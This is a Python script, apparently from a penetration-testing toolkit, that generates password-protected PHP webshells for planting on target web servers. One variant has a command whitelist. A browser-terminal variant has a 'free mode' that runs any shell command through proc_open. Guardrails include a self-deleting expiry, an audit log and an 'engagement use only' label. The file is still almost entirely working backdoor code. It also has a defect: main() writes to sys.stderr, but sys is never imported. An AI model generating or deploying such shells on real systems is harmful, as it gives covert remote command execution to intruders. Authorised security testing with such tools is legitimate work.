#!/usr/bin/env python3
"""shell/web_shell_gen.py — single-file shell generator (HTML+CSS+JS+PHP).

Two variants (--variant):
  cli  : no UI, Basic 401 gate + Authorization header, command whitelist.
         Safest — for programs that forbid interactive shells.
  web  : HTML login page (no Basic Auth popup), in-browser terminal,
         whitelist + optional "free mode" (any command via checkbox).
         For programs that allow a full execution demo.
  default: both.

Both: bcrypt cost 12, TTL auto-unlink, audit log, no eval/uploader/revshell.
32-hex random filename. Credentials -> CREDENTIALS-<ts>.txt.

Standalone (does not import the exploit chains). bcrypt needs a venv:
  python3 web_shell_gen.py --out <dir> --ttl 24 [--variant web]
"""
from __future__ import annotations

import argparse
import os
import secrets
import time
from pathlib import Path

try:
    import bcrypt
except ImportError:
    bcrypt = None  # type: ignore

HEX = "0123456789abcdef"
ALLOWED_DEFAULT = ["id", "whoami", "uname -a", "pwd", "hostname", "php -v"]


def _rand_name() -> str:
    return "".join(secrets.choice(HEX) for _ in range(32)) + ".php"


def _q(v: str) -> str:
    return "'" + v.replace("\\", "\\\\").replace("'", "\\'") + "'"


def render(*, password: str, ttl_hours: float, variant: str,
           allowed: list[str] | None = None) -> str:
    if bcrypt is None:
        raise SystemExit("bcrypt not installed — run: pip install bcrypt")
    h = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)).decode()
    expires = int(time.time() + ttl_hours * 3600)
    allowed_php = "[" + ",".join(_q(a) for a in (allowed or ALLOWED_DEFAULT)) + "]"
    if variant == "cli":
        return _cli_tpl(h, expires, allowed_php)
    return _web_tpl(h, expires, allowed_php)


def _cli_tpl(h: str, expires: int, allowed_php: str) -> str:
    return r"""<?php
/**
 * Managed CLI shell — engagement use only. Whitelist-only.
 * Accepts password via POST/GET 'k' OR HTTP Basic header (browser popup).
 * Auto-unlink after TTL. No eval/uploader/revshell.
 */
declare(strict_types=1);
const PW_HASH = '%HASH%';
const EXPIRES = %EXPIRES%;
const ALLOWED = %ALLOWED%;
const LOGFILE = __DIR__ . '/.shell-audit.log';
const MAX_OUT = 8192;
function audit(string $e, string $x = ''): void {
    @file_put_contents(LOGFILE, sprintf("%s\t%s\t%s\n", gmdate('c'),
        $_SERVER['REMOTE_ADDR'] ?? '-', $e . ($x !== '' ? ' ' . $x : '')), FILE_APPEND | LOCK_EX);
}
function deny(int $c, string $m): void { http_response_code($c); echo $m, "\n"; exit; }
if (time() > EXPIRES) { audit('expired'); @unlink(__FILE__); @unlink(LOGFILE); deny(410, 'gone'); }
$provided = $_POST['k'] ?? $_GET['k'] ?? '';
if ($provided === '' && isset($_SERVER['PHP_AUTH_USER'])) { $provided = $_SERVER['PHP_AUTH_USER']; }
if ($provided === '' && preg_match('/Basic\s+(.*)$/i', $_SERVER['HTTP_AUTHORIZATION'] ?? '', $m)) {
    $d = base64_decode($m[1]); $provided = explode(':', $d)[0] ?? '';
}
if ($provided === '' || !password_verify($provided, PW_HASH)) {
    audit($provided === '' ? 'no-cred' : 'bad-cred');
    header('WWW-Authenticate: Basic realm="restricted"');
    deny(401, 'authentication required');
}
$cmd = trim($_POST['c'] ?? $_GET['c'] ?? '');
if ($cmd === '') { header('Content-Type: text/plain'); echo "ok\n"; exit; }
if (!in_array($cmd, ALLOWED, true)) { audit('blocked', $cmd); deny(403, 'not in whitelist'); }
audit('exec', $cmd);
$out = []; $rc = 0; @exec($cmd . ' 2>&1', $out, $rc);
header('Content-Type: text/plain');
echo substr(implode("\n", $out), 0, MAX_OUT), "\n[rc=$rc]\n";
""".replace("%HASH%", h).replace("%EXPIRES%", str(expires)).replace("%ALLOWED%", allowed_php)


def _web_tpl(h: str, expires: int, allowed_php: str) -> str:
    return r"""<?php
declare(strict_types=1);
const PW_HASH = '%HASH%';
const EXPIRES = %EXPIRES%;
const ALLOWED = %ALLOWED%;
const LOGFILE = __DIR__ . '/.shell-audit.log';
const MAX_OUT = 8192;
function audit(string $e, string $x = ''): void {
    @file_put_contents(LOGFILE, sprintf("%s\t%s\t%s\n", gmdate('c'),
        $_SERVER['REMOTE_ADDR'] ?? '-', $e . ($x !== '' ? ' ' . $x : '')), FILE_APPEND | LOCK_EX);
}
function deny(int $c, string $m): void { http_response_code($c); echo $m; exit; }
if (time() > EXPIRES) { audit('expired'); @unlink(__FILE__); @unlink(LOGFILE); deny(410, 'gone'); }
session_start();
function logged_in(): bool { return !empty($_SESSION['ok']); }
$act = $_POST['a'] ?? $_GET['a'] ?? '';
if ($act === 'login') {
    $k = $_POST['k'] ?? '';
    if (password_verify($k, PW_HASH)) { session_regenerate_id(true); $_SESSION['ok'] = true; audit('login-ok');
        header('Content-Type: application/json'); echo json_encode(['ok' => true]); exit;
    }
    audit('login-fail'); usleep(300000);
    header('Content-Type: application/json');
    echo json_encode(['ok' => false, 'err' => 'wrong password']); exit;
}
if ($act === 'logout') { audit('logout'); $_SESSION = []; session_destroy();
    header('Content-Type: application/json'); echo json_encode(['ok' => true]); exit; }
if ($act === 'cmd') {
    if (!logged_in()) { audit('cmd-noauth'); deny(401, 'authentication required'); }
    $c = $_POST['c'] ?? ''; $out = '';
    if ($c === '__free__') {
        $cmd = $_POST['cmd'] ?? '';
        if ($cmd === '') { deny(400, 'empty cmd'); }
        audit('exec-free', $cmd);
        $proc = proc_open($cmd, [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes);
        if (is_resource($proc)) {
            $out = (string)stream_get_contents($pipes[1], MAX_OUT)
                 . (string)stream_get_contents($pipes[2], MAX_OUT);
            fclose($pipes[1]); fclose($pipes[2]); proc_close($proc);
        } else { $out = 'proc_open failed'; }
    } else {
        if (!in_array($c, ALLOWED, true)) { audit('exec-reject', $c);
            deny(403, 'command not in whitelist (use free mode)'); }
        audit('exec', $c);
        $out = shell_exec(escapeshellcmd($c) . ' 2>&1') ?: '';
    }
    header('Content-Type: text/plain; charset=utf-8');
    echo substr($out, 0, MAX_OUT); exit;
}
if (!logged_in()): audit('page-login');
?><!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>restricted</title>
<style>
:root{--bg:#0b0f14;--fg:#d7e0ea;--ac:#37c882;--er:#ff5f56}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);font:14px/1.5 ui-monospace,monospace;display:grid;place-items:center;min-height:100vh}
.card{background:#111820;border:1px solid #1f2a36;border-radius:10px;padding:32px;min-width:320px}
h1{font-size:15px;margin:0 0 18px;color:var(--ac);letter-spacing:2px}
input{width:100%;padding:10px 12px;background:#0b0f14;border:1px solid #2a3644;color:var(--fg);border-radius:6px;font:inherit;outline:none}
input:focus{border-color:var(--ac)}
button{margin-top:14px;width:100%;padding:10px;background:#132a20;border:1px solid var(--ac);color:var(--ac);border-radius:6px;font:inherit;cursor:pointer}
.err{color:var(--er);font-size:12px;margin-top:10px;min-height:16px}
.ttl{text-align:center;color:#5a6b7d;font-size:11px;margin-top:16px}
</style></head><body>
<div class="card"><h1>&#9679; RESTRICTED SHELL</h1>
<form id="f"><input id="k" type="password" placeholder="password" autofocus autocomplete="off">
<button type="submit">ENTER</button><div class="err" id="e"></div></form>
<div class="ttl">session audited &middot; ttl automatic</div></div>
<script>
document.getElementById('f').addEventListener('submit', async (ev) => {
  ev.preventDefault();
  const fd = new FormData(); fd.append('a','login'); fd.append('k', document.getElementById('k').value);
  const j = await (await fetch(location.href, {method:'POST', body: fd})).json();
  if (j.ok) location.reload(); else document.getElementById('e').textContent = j.err || 'failed';
});
</script></body></html>
<?php else: audit('page-term');
?><!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>shell</title>
<style>
:root{--bg:#0b0f14;--fg:#d7e0ea;--ac:#37c882;--er:#ff5f56;--dim:#5a6b7d}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--fg);font:13px/1.5 ui-monospace,monospace;height:100vh;display:flex;flex-direction:column}
header{padding:8px 14px;border-bottom:1px solid #1f2a36;display:flex;gap:12px;align-items:center}
header b{color:var(--ac)} header .sp{flex:1}
header button{background:none;border:1px solid #2a3644;color:var(--dim);border-radius:5px;padding:3px 10px;cursor:pointer;font:inherit}
#out{flex:1;overflow-y:auto;padding:14px;white-space:pre-wrap;word-break:break-word}
.in{display:flex;gap:8px;padding:10px 14px;border-top:1px solid #1f2a36;align-items:center}
.ps{color:var(--ac)}
.in input[type=text]{flex:1;background:transparent;border:none;color:var(--fg);font:inherit;outline:none}
#freewrap{margin-left:10px;color:var(--dim);font-size:12px;display:flex;align-items:center;gap:5px}
</style></head><body>
<header><b>shell</b><span class="sp"></span><button id="x">logout</button></header>
<div id="out"></div>
<div class="in"><span class="ps">$</span><input id="c" type="text" autofocus>
<label id="freewrap"><input type="checkbox" id="free"> free mode</label></div>
<script>
const out = document.getElementById('out');
async function run(cmd) {
  const fd = new FormData(); fd.append('a','cmd');
  if (document.getElementById('free').checked) { fd.append('c','__free__'); fd.append('cmd', cmd); }
  else { fd.append('c', cmd); }
  const r = await fetch(location.href, {method:'POST', body: fd});
  return await r.text();
}
document.getElementById('c').addEventListener('keydown', async (e) => {
  if (e.key !== 'Enter') return;
  const cmd = e.target.value; e.target.value = '';
  out.textContent += '$ ' + cmd + '\n';
  out.textContent += await run(cmd) + '\n';
  out.scrollTop = out.scrollHeight;
});
document.getElementById('x').addEventListener('click', async () => {
  await fetch(location.href, {method:'POST', body: new URLSearchParams({a:'logout'})});
  location.reload();
});
</script></body></html>
""".replace("%HASH%", h).replace("%EXPIRES%", str(expires)).replace("%ALLOWED%", allowed_php)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Generate a single-file webshell (cli / web / both)")
    ap.add_argument("--out", default="./out", help="output directory")
    ap.add_argument("--ttl", type=float, default=24, help="lifetime (hours), default 24")
    ap.add_argument("--variant", choices=("cli", "web", "both"), default="both")
    ap.add_argument("--password", default="", help="explicit password; empty = random")
    ap.add_argument("--commands", default="",
                    help="whitelist comma-separated; empty = default")
    a = ap.parse_args()

    if bcrypt is None:
        print("bcrypt not installed — run: pip install bcrypt", file=sys.stderr)
        return 2
    if a.ttl <= 0:
        print("REJECTED: --ttl must be > 0", file=sys.stderr)
        return 2

    commands = [c.strip() for c in a.commands.split(",") if c.strip()] or list(ALLOWED_DEFAULT)
    risky = [c for c in commands
             if any(t in c for t in (";", "|", "&&", "`", "$(", ">"))]
    if risky:
        print("REJECTED: command contains shell operators:", risky, file=sys.stderr)
        return 2

    out_dir = Path(a.out)
    out_dir.mkdir(parents=True, exist_ok=True)
    ts = int(time.time())
    variants = ["cli", "web"] if a.variant == "both" else [a.variant]
    password = a.password or secrets.token_urlsafe(18)

    cred_lines = [f"generated: {time.strftime('%Y-%m-%d %H:%M:%S')}",
                  f"ttl     : {a.ttl}h",
                  f"password: {password}",
                  f"commands: {', '.join(commands)}",
                  ""]
    for v in variants:
        body = render(password=password, ttl_hours=a.ttl, variant=v,
                      allowed=commands)
        name = _rand_name()
        path = out_dir / name
        path.write_text(body, encoding="utf-8")
        try:
            os.chmod(path, 0o600)
        except OSError:
            pass
        cred_lines.append(f"{v:4}: {path}")
        print(f"[+] {v:4}: {path}")

    cred_path = out_dir / f"CREDENTIALS-{ts}.txt"
    cred_path.write_text("\n".join(cred_lines) + "\n", encoding="utf-8")
    try:
        os.chmod(cred_path, 0o600)
    except OSError:
        pass
    print(f"[+] creds: {cred_path}  (mode 600 — NEVER commit)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
